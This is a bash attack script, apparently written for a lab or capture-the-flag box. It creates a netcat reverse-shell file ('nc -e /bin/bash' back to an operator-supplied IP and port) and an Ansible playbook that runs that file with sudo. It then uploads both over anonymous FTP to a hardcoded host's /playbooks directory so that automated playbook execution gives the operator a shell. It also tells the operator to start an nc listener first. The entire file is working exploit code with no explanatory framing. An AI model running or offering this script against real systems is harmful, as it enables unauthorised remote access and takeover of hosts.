#!/bin/bash

# Usage function
usage() {
  echo "Usage: $0 <reverse_shell_ip> <reverse_shell_port>"
  exit 1
}

# Check if correct number of arguments are passed
if [ $# -ne 2 ]; then
  usage
fi

# Assign arguments to variables
reverse_shell_ip=$1
reverse_shell_port=$2

echo "Reverse shell IP: $reverse_shell_ip"
echo "Reverse shell port: $reverse_shell_port"

sleep 0.5s 
echo
echo "Before running the script, set up a listener with the following command: nc -nlvp $reverse_shell_port"
echo 
echo "Takes up to 60s before getting the shell, run script again if you don't get a reverse shell"

read -p "Press <enter> to continue"

echo "nc -nlvp $reverse_shell_port -s $reverse_shell_ip"

ftp_server="10.0.200.84"
ftp_user="anonymous"
ftp_pass="anonymous"
remote_path_playbook="/playbooks/create_shell_playbook.yml"
remote_path_shell="/playbooks/shell.sh"
local_file_shell="shell.sh"
local_file_playbook="create_shell_playbook.yml"

# Create the shell.sh file with reverse shell command
cat <<EOF > $local_file_shell
#!/bin/bash
nc -e /bin/bash $reverse_shell_ip $reverse_shell_port 0>&1
EOF

echo "shell.sh file created with reverse shell."

# Create the Ansible playbook file
cat <<EOF > $local_file_playbook
---
- name: Display known facts for host
  hosts: 127.0.0.1
  sudo: true
  sudo_user: ftp
  connection: local
  gather_facts: false
  tasks:
    - name: Display all variables/facts
      debug:
        var: hostvars[inventory_hostname]
        verbosity: 4

    - name: execute file 
      command: /bin/bash shell.sh
EOF

echo "Ansible playbook 'create_shell_playbook.yml' created in the current directory."

# FTP upload
ftp -inv $ftp_server <<EOF
user $ftp_user $ftp_pass
put $local_file_shell $remote_path_shell
put $local_file_playbook $remote_path_playbook
EOF

echo "Files uploaded successfully to FTP server under /playbooks."

# Remove the local files after upload
rm -f $local_file_shell $local_file_playbook
echo "Have Fun );"
